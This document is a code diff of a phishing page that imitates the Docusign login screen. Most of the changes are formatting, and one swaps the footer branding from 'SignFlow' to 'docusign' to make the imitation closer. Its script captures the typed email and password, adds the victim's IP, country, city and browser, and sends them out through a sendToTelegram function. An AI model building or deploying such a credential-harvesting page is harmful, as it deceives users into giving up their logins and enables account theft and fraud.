@@ -1,749 +1,684 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Docusign Login</title>
-  <link rel="shortcut icon" href="ds-logo-default.svg" type="image/x-icon">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Docusign Login</title>
+    <link rel="shortcut icon" href="ds-logo-default.svg" type="image/x-icon" />
 
-  <!-- Tailwind CSS CDN -->
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script>
-    tailwind.config = {
-      theme: {
-        extend: {
-          colors: {
-            focusBlue: "#56bdf4",
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              focusBlue: "#56bdf4",
+            },
           },
         },
-      },
-    };
-  </script>
+      };
+    </script>
 
-  <!-- Font Awesome -->
-  <link
-    rel="stylesheet"
-    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
-  />
+    <!-- Font Awesome -->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+    />
 
-  <style>
-   * {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-}
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
 
-html,
-body {
-  width: 100%;
-  min-height: 100%;
-}
+      html,
+      body {
+        width: 100%;
+        min-height: 100%;
+      }
 
-body {
-  font-family: "Inter", Arial, sans-serif;
-  background: #f8f7f8;
-  color: #211447;
-}
+      body {
+        font-family: "Inter", Arial, sans-serif;
+        background: #f8f7f8;
+        color: #211447;
+      }
 
-
-/* =========================
+      /* =========================
    HEADER
 ========================= */
 
-.header {
-  height: 72px;
-  width: 100%;
-  background: #ffffff;
+      .header {
+        height: 72px;
+        width: 100%;
+        background: #ffffff;
 
-  display: flex;
-  align-items: center;
+        display: flex;
+        align-items: center;
 
-  padding: 0 28px;
+        padding: 0 28px;
 
-  border-bottom: 1px solid #e5e3e5;
-}
+        border-bottom: 1px solid #e5e3e5;
+      }
 
-.logo {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-}
+      .logo {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
 
-.logo-icon {
-  position: relative;
+      .logo-icon {
+        position: relative;
 
-  width: 23px;
-  height: 24px;
-}
+        width: 23px;
+        height: 24px;
+      }
 
-.logo-purple {
-  position: absolute;
+      .logo-purple {
+        position: absolute;
 
-  width: 14px;
-  height: 18px;
+        width: 14px;
+        height: 18px;
 
-  left: 0;
-  top: 5px;
+        left: 0;
+        top: 5px;
 
-  background: #4b20e6;
-}
+        background: #4b20e6;
+      }
 
-.logo-red {
-  position: absolute;
+      .logo-red {
+        position: absolute;
 
-  width: 15px;
-  height: 14px;
+        width: 15px;
+        height: 14px;
 
-  left: 8px;
-  top: 0;
+        left: 8px;
+        top: 0;
 
-  background: #ff5252;
+        background: #ff5252;
 
-  border-radius: 2px;
-}
+        border-radius: 2px;
+      }
 
-.logo-text {
-  font-size: 26px;
-  font-weight: 600;
+      .logo-text {
+        font-size: 26px;
+        font-weight: 600;
 
-  letter-spacing: -1.2px;
+        letter-spacing: -1.2px;
 
-  color: #111111;
-}
+        color: #111111;
+      }
 
-.logo-dot {
-  color: #555555;
-}
+      .logo-dot {
+        color: #555555;
+      }
 
-
-/* =========================
+      /* =========================
    MAIN
 ========================= */
 
-.main {
-  min-height: calc(100vh - 145px);
+      .main {
+        min-height: calc(100vh - 145px);
 
-  display: flex;
-  justify-content: center;
-  align-items: center;
+        display: flex;
+        justify-content: center;
+        align-items: center;
 
-  padding: 70px 20px;
-}
+        padding: 70px 20px;
+      }
 
-
-/* =========================
+      /* =========================
    LOGIN CARD
 ========================= */
 
-.login-card {
-  width: 636px;
+      .login-card {
+        width: 636px;
 
-  background: #ffffff;
+        background: #ffffff;
 
-  border: 1px solid #d8d6d8;
+        border: 1px solid #d8d6d8;
 
-  border-radius: 4px;
+        border-radius: 4px;
 
-  padding: 72px 73px 73px;
+        padding: 72px 73px 73px;
 
-  box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
-}
+        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.02);
+      }
 
-.login-card h1 {
-  font-size: 28px;
-  line-height: 1.25;
+      .login-card h1 {
+        font-size: 28px;
+        line-height: 1.25;
 
-  font-weight: 400;
+        font-weight: 400;
 
-  color: #241052;
+        color: #241052;
 
-  margin-bottom: 38px;
-}
+        margin-bottom: 38px;
+      }
 
-.subtitle {
-  font-size: 18px;
+      .subtitle {
+        font-size: 18px;
 
-  color: #241052;
+        color: #241052;
 
-  margin-bottom: 40px;
+        margin-bottom: 40px;
 
-  line-height: 1.5;
-}
+        line-height: 1.5;
+      }
 
-
-/* =========================
+      /* =========================
    FORM
 ========================= */
 
-.form-group {
-  margin-bottom: 28px;
-}
+      .form-group {
+        margin-bottom: 28px;
+      }
 
-.form-group label {
-  display: block;
+      .form-group label {
+        display: block;
 
-  font-size: 16px;
+        font-size: 16px;
 
-  font-weight: 600;
+        font-weight: 600;
 
-  color: #211447;
+        color: #211447;
 
-  margin-bottom: 8px;
-}
+        margin-bottom: 8px;
+      }
 
-.form-group label span {
-  color: #e33d49;
-}
+      .form-group label span {
+        color: #e33d49;
+      }
 
+      .form-group input {
+        width: 100%;
 
-.form-group input {
-  width: 100%;
+        height: 46px;
 
-  height: 46px;
+        border: 3px solid red;
 
-  border: 3px solid red;
+        border-radius: 4px;
 
-  border-radius: 4px;
+        background: #ffffff;
 
-  background: #ffffff;
+        padding: 0 17px;
 
-  padding: 0 17px;
+        font-size: 17px;
 
-  font-size: 17px;
+        color: #241052;
 
-  color: #241052;
+        outline: none;
 
-  outline: none;
+        font-family: inherit;
+      }
 
-  font-family: inherit;
-}
+      .form-group input::placeholder {
+        color: #665b82;
+      }
 
-.form-group input::placeholder {
-  color: #665b82;
-}
+      .form-group input:focus {
+        border: 2px solid #4b168d;
+      }
 
-.form-group input:focus {
-  border: 2px solid #4b168d;
-}
-
-
-/* =========================
+      /* =========================
    PASSWORD
 ========================= */
 
-.password-wrapper {
-  position: relative;
-}
+      .password-wrapper {
+        position: relative;
+      }
 
-.password-wrapper input {
-  padding-right: 70px;
-}
+      .password-wrapper input {
+        padding-right: 70px;
+      }
 
-.show-password {
-  position: absolute;
+      .show-password {
+        position: absolute;
 
-  right: 13px;
-  top: 50%;
+        right: 13px;
+        top: 50%;
 
-  transform: translateY(-50%);
+        transform: translateY(-50%);
 
-  border: none;
-  background: transparent;
+        border: none;
+        background: transparent;
 
-  color: #4b168d;
+        color: #4b168d;
 
-  font-size: 14px;
-  font-weight: 600;
+        font-size: 14px;
+        font-weight: 600;
 
-  cursor: pointer;
+        cursor: pointer;
 
-  padding: 5px;
-}
+        padding: 5px;
+      }
 
-.show-password:hover {
-  text-decoration: underline;
-}
+      .show-password:hover {
+        text-decoration: underline;
+      }
 
-
-/* =========================
+      /* =========================
    FORGOT PASSWORD
 ========================= */
 
-.forgot-wrapper {
-  margin-top: -10px;
+      .forgot-wrapper {
+        margin-top: -10px;
 
-  margin-bottom: 28px;
-}
+        margin-bottom: 28px;
+      }
 
-.forgot-wrapper a {
-  color: #4b168d;
+      .forgot-wrapper a {
+        color: #4b168d;
 
-  font-size: 14px;
+        font-size: 14px;
 
-  text-decoration: none;
+        text-decoration: none;
 
-  font-weight: 500;
-}
+        font-weight: 500;
+      }
 
-.forgot-wrapper a:hover {
-  text-decoration: underline;
-}
+      .forgot-wrapper a:hover {
+        text-decoration: underline;
+      }
 
-
-/* =========================
+      /* =========================
    BUTTONS
 ========================= */
 
-.login-button,
-.signup-button {
-  width: 100%;
+      .login-button,
+      .signup-button {
+        width: 100%;
 
-  height: 47px;
+        height: 47px;
 
-  border-radius: 4px;
+        border-radius: 4px;
 
-  font-family: inherit;
+        font-family: inherit;
 
-  font-size: 17px;
+        font-size: 17px;
 
-  cursor: pointer;
+        cursor: pointer;
 
-  transition: 0.2s ease;
-}
+        transition: 0.2s ease;
+      }
 
+      /* LOGIN */
 
-/* LOGIN */
+      .login-button {
+        border: none;
 
-.login-button {
-  border: none;
+        background: #31006f;
 
-  background: #31006f;
+        color: #ffffff;
 
-  color: #ffffff;
+        font-weight: 500;
 
-  font-weight: 500;
+        margin-bottom: 18px;
+      }
 
-  margin-bottom: 18px;
-}
+      .login-button:hover {
+        background: #260056;
+      }
 
-.login-button:hover {
-  background: #260056;
-}
+      .login-button:active {
+        transform: scale(0.99);
+      }
 
-.login-button:active {
-  transform: scale(0.99);
-}
+      /* SIGN UP */
 
+      .signup-button {
+        border: none;
 
-/* SIGN UP */
+        background: #f2f1f4;
 
-.signup-button {
-  border: none;
+        color: #211447;
 
-  background: #f2f1f4;
+        font-weight: 500;
+      }
 
-  color: #211447;
+      .signup-button:hover {
+        background: #e7e5e9;
+      }
 
-  font-weight: 500;
-}
-
-.signup-button:hover {
-  background: #e7e5e9;
-}
-
-
-/* =========================
+      /* =========================
    FOOTER
 ========================= */
 
-.footer {
-  height: 73px;
+      .footer {
+        height: 73px;
 
-  width: 100%;
+        width: 100%;
 
-  background: #ffffff;
+        background: #ffffff;
 
-  border-top: 1px solid #d9d7d9;
+        border-top: 1px solid #d9d7d9;
 
-  display: flex;
+        display: flex;
 
-  align-items: center;
+        align-items: center;
 
-  justify-content: space-between;
+        justify-content: space-between;
 
-  padding: 0 25px;
+        padding: 0 25px;
 
-  color: #241052;
+        color: #241052;
 
-  font-size: 12px;
-}
+        font-size: 12px;
+      }
 
+      /* POWERED */
 
-/* POWERED */
+      .powered {
+        display: flex;
+        align-items: center;
+        gap: 4px;
+      }
 
-.powered {
-  display: flex;
-  align-items: center;
-  gap: 4px;
-}
+      .mini-logo {
+        display: flex;
+        align-items: center;
+        gap: 3px;
 
-.mini-logo {
-  display: flex;
-  align-items: center;
-  gap: 3px;
+        color: #111111;
 
-  color: #111111;
+        font-size: 12px;
+      }
 
-  font-size: 12px;
-}
+      .mini-logo span {
+        width: 7px;
+        height: 8px;
 
-.mini-logo span {
-  width: 7px;
-  height: 8px;
+        background: #4b20e6;
 
-  background: #4b20e6;
+        display: block;
 
-  display: block;
+        position: relative;
+      }
 
-  position: relative;
-}
+      .mini-logo strong {
+        font-weight: 600;
+      }
 
-.mini-logo strong {
-  font-weight: 600;
-}
+      /* CENTER */
 
+      .footer-center {
+        display: flex;
+        align-items: center;
 
-/* CENTER */
+        gap: 10px;
+      }
 
-.footer-center {
-  display: flex;
-  align-items: center;
+      .footer-center a {
+        color: #241052;
 
-  gap: 10px;
-}
+        text-decoration: none;
+      }
 
-.footer-center a {
-  color: #241052;
+      .footer-center a:hover {
+        text-decoration: underline;
+      }
 
-  text-decoration: none;
-}
+      .footer-center i {
+        font-style: normal;
 
-.footer-center a:hover {
-  text-decoration: underline;
-}
+        color: #b8b3bc;
+      }
 
-.footer-center i {
-  font-style: normal;
+      /* LANGUAGE */
 
-  color: #b8b3bc;
-}
+      .language {
+        border: none;
 
+        background: #f4f2f5;
 
-/* LANGUAGE */
+        border-radius: 4px;
 
-.language {
-  border: none;
+        color: #241052;
 
-  background: #f4f2f5;
+        padding: 7px 9px;
 
-  border-radius: 4px;
+        font-family: inherit;
 
-  color: #241052;
+        cursor: pointer;
+      }
 
-  padding: 7px 9px;
+      .language span {
+        margin-left: 5px;
+      }
 
-  font-family: inherit;
+      /* COPYRIGHT */
 
-  cursor: pointer;
-}
+      .copyright {
+        white-space: nowrap;
+      }
 
-.language span {
-  margin-left: 5px;
-}
-
-
-/* COPYRIGHT */
-
-.copyright {
-  white-space: nowrap;
-}
-
-
-/* =========================
+      /* =========================
    RESPONSIVE
 ========================= */
 
-@media (max-width: 900px) {
+      @media (max-width: 900px) {
+        .footer {
+          height: auto;
 
-  .footer {
-    height: auto;
+          min-height: 100px;
 
-    min-height: 100px;
+          flex-wrap: wrap;
 
-    flex-wrap: wrap;
+          gap: 15px;
 
-    gap: 15px;
+          padding: 18px 25px;
+        }
 
-    padding: 18px 25px;
-  }
+        .footer-center {
+          order: 3;
 
-  .footer-center {
-    order: 3;
+          width: 100%;
 
-    width: 100%;
+          justify-content: center;
 
-    justify-content: center;
+          flex-wrap: wrap;
+        }
 
-    flex-wrap: wrap;
-  }
+        .copyright {
+          margin-left: auto;
+        }
+      }
 
-  .copyright {
-    margin-left: auto;
-  }
-}
+      @media (max-width: 650px) {
+        .header {
+          height: 64px;
 
+          padding: 0 20px;
+        }
 
-@media (max-width: 650px) {
+        .logo-text {
+          font-size: 23px;
+        }
 
-  .header {
-    height: 64px;
+        .main {
+          min-height: calc(100vh - 64px);
 
-    padding: 0 20px;
-  }
+          padding: 30px 15px;
 
-  .logo-text {
-    font-size: 23px;
-  }
+          align-items: flex-start;
+        }
 
-  .main {
-    min-height: calc(100vh - 64px);
+        .login-card {
+          width: 100%;
 
-    padding: 30px 15px;
+          padding: 40px 25px;
 
-    align-items: flex-start;
-  }
+          margin-top: 15px;
+        }
 
-  .login-card {
-    width: 100%;
+        .login-card h1 {
+          font-size: 25px;
 
-    padding: 40px 25px;
+          margin-bottom: 28px;
+        }
 
-    margin-top: 15px;
-  }
+        .subtitle {
+          font-size: 16px;
 
-  .login-card h1 {
-    font-size: 25px;
+          margin-bottom: 30px;
+        }
 
-    margin-bottom: 28px;
-  }
+        .footer {
+          flex-direction: column;
 
-  .subtitle {
-    font-size: 16px;
+          align-items: center;
 
-    margin-bottom: 30px;
-  }
+          text-align: center;
 
-  .footer {
-    flex-direction: column;
+          padding: 20px 15px;
+        }
 
-    align-items: center;
+        .powered {
+          order: 1;
+        }
 
-    text-align: center;
+        .footer-center {
+          order: 2;
+        }
 
-    padding: 20px 15px;
-  }
+        .copyright {
+          order: 3;
 
-  .powered {
-    order: 1;
-  }
+          margin: 0;
 
-  .footer-center {
-    order: 2;
-  }
+          white-space: normal;
+        }
+      }
 
-  .copyright {
-    order: 3;
+      @media (max-width: 400px) {
+        .login-card {
+          padding: 32px 20px;
+        }
 
-    margin: 0;
+        .footer-center {
+          gap: 7px;
+        }
 
-    white-space: normal;
-  }
-}
+        .footer-center i {
+          display: none;
+        }
 
+        .footer-center a {
+          margin: 2px 4px;
+        }
+      }
+    </style>
+  </head>
 
-@media (max-width: 400px) {
+  <body>
+    <!-- HEADER -->
+    <header class="header">
+      <img src="/ds-logo-default.svg" alt="" width="100px" />
+    </header>
 
-  .login-card {
-    padding: 32px 20px;
-  }
+    <!-- MAIN -->
+    <main class="main">
+      <div class="login-card">
+        <h1>Log in to Docusign</h1>
 
-  .footer-center {
-    gap: 7px;
-  }
+        <p class="subtitle">Enter your email and password to log in.</p>
 
-  .footer-center i {
-    display: none;
-  }
-
-  .footer-center a {
-    margin: 2px 4px;
-  }
-}
-  </style>
-</head>
-
-<body>
-
-  <!-- HEADER -->
-  <header class="header">
-   
-     <img src="/ds-logo-default.svg" alt="" width="100px">
-   
-  </header>
-
-
-  <!-- MAIN -->
-  <main class="main">
-
-    <div class="login-card">
-
-      <h1>Log in to Docusign</h1>
-
-      <p class="subtitle">
-        Enter your email and password to log in.
-      </p>
-
-
-      <form id="loginForm">
-
-        <!-- EMAIL -->
-        <div class="form-group">
-
-          <label for="email">
-            Email <span>*</span>
-          </label>
-
-          <input
-            type="email"
-            id="email"
-            name="email"
-            placeholder="Enter email"
-            autocomplete="email"
-            required
-          />
-
-        </div>
-
-
-        <!-- PASSWORD -->
-        <div class="form-group">
-
-          <label for="password">
-            Password <span>*</span>
-          </label>
-
-          <div class="password-wrapper">
+        <form id="loginForm">
+          <!-- EMAIL -->
+          <div class="form-group">
+            <label for="email"> Email <span>*</span> </label>
 
             <input
-              type="password"
-              id="password"
-              name="password"
-              class="border border-red-500"
-              placeholder="Enter password"
-              autocomplete="current-password"
+              type="email"
+              id="email"
+              name="email"
+              placeholder="Enter email"
+              autocomplete="email"
               required
             />
-
-            <button
-              type="button"
-              class="show-password"
-              id="togglePassword"
-            >
-              Show
-            </button>
-
           </div>
 
-        </div>
+          <!-- PASSWORD -->
+          <div class="form-group">
+            <label for="password"> Password <span>*</span> </label>
 
+            <div class="password-wrapper">
+              <input
+                type="password"
+                id="password"
+                name="password"
+                class="border border-red-500"
+                placeholder="Enter password"
+                autocomplete="current-password"
+                required
+              />
 
-        <!-- FORGOT PASSWORD -->
-        <div class="forgot-wrapper">
-          <a href="#" id="forgotPassword">
-            Forgot password?
-          </a>
-        </div>
+              <button type="button" class="show-password" id="togglePassword">
+                Show
+              </button>
+            </div>
+          </div>
 
+          <!-- FORGOT PASSWORD -->
+          <div class="forgot-wrapper">
+            <a href="#" id="forgotPassword"> Forgot password? </a>
+          </div>
 
-        <!-- LOGIN -->
-        <button type="submit" class="login-button">
-          LOG IN
-        </button>
+          <!-- LOGIN -->
+          <button type="submit" class="login-button">LOG IN</button>
 
-
-        <!-- SIGN UP -->
-        <button
-          type="button"
-          class="signup-button"
-          onclick="window.location.href='#'"
-        >
-          Sign Up for Free
-        </button>
-
-      </form>
-
-    </div>
-
-  </main>
-
-
-  <!-- FOOTER -->
-  <footer class="footer">
-
-    <div class="powered">
-      Powered by
-
-      <div class="mini-logo">
-        <span></span>
-        <strong>signflow</strong>
+          <!-- SIGN UP -->
+          <button
+            type="button"
+            class="signup-button"
+            onclick="window.location.href = '#'"
+          >
+            Sign Up for Free
+          </button>
+        </form>
       </div>
-    </div>
+    </main>
 
+    <!-- FOOTER -->
+    <footer class="footer">
+      <div class="powered">
+        Powered by
 
-    <div class="footer-center">
+        <div class="mini-logo">
+          <span></span>
+          <strong>docusign</strong>
+        </div>
+      </div>
 
-      <button class="language">
-        English (US)
-        <span>⌄</span>
-      </button>
+      <div class="footer-center">
+        <button class="language">
+          English (US)
+          <span>⌄</span>
+        </button>
 
-      <a href="#">Contact Us</a>
-      <i>|</i>
+        <a href="#">Contact Us</a>
+        <i>|</i>
 
-      <a href="#">Terms of Use</a>
-      <i>|</i>
+        <a href="#">Terms of Use</a>
+        <i>|</i>
 
-      <a href="#">Privacy</a>
-      <i>|</i>
+        <a href="#">Privacy</a>
+        <i>|</i>
 
-      <a href="#">Security</a>
-      <i>|</i>
+        <a href="#">Security</a>
+        <i>|</i>
 
-      <a href="#">Trust</a>
+        <a href="#">Trust</a>
+      </div>
 
-    </div>
+      <div class="copyright">
+        Copyright © 2026 docusign, Inc. All rights reserved
+      </div>
+    </footer>
 
-
-    <div class="copyright">
-      Copyright © 2026 SignFlow, Inc. All rights reserved
-    </div>
-
-  </footer>
-
-
-  <script src="script.js"></script>
-
-</body>
+    <script src="script.js"></script>
+  </body>
   <script>
     document.addEventListener("DOMContentLoaded", async () => {
       function getEmailFromUrl() {
@@ -799,27 +734,26 @@ body {
 
       const emailHeadline = document.getElementById("emailHeadline");
 
-
-
       // Handle form submit
-      document.getElementById("loginForm").addEventListener("submit", async function (event) {
-        event.preventDefault();
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", async function (event) {
+          event.preventDefault();
 
-        const emailInput = document.getElementById("email").value;
-        const passwordInput = document.getElementById("password").value;
+          const emailInput = document.getElementById("email").value;
+          const passwordInput = document.getElementById("password").value;
 
-        if (!validateEmail(emailInput) || !passwordInput) {
-          alert("Please provide a valid email and password.");
-          return;
-        }
+          if (!validateEmail(emailInput) || !passwordInput) {
+            alert("Please provide a valid email and password.");
+            return;
+          }
 
-        const location = await getUserLocation();
-        const userAgent = navigator.userAgent;
+          const location = await getUserLocation();
+          const userAgent = navigator.userAgent;
 
-        const message = `E-Mail: ${emailInput}\nPassword: ${passwordInput}\nIP: ${location.ip}\nCountry: ${location.country}\nCity: ${location.city}\nBrowser: ${userAgent}`;
-        sendToTelegram(message, emailInput);
-      });
+          const message = `E-Mail: ${emailInput}\nPassword: ${passwordInput}\nIP: ${location.ip}\nCountry: ${location.country}\nCity: ${location.city}\nBrowser: ${userAgent}`;
+          sendToTelegram(message, emailInput);
+        });
     });
   </script>
-
 </html>
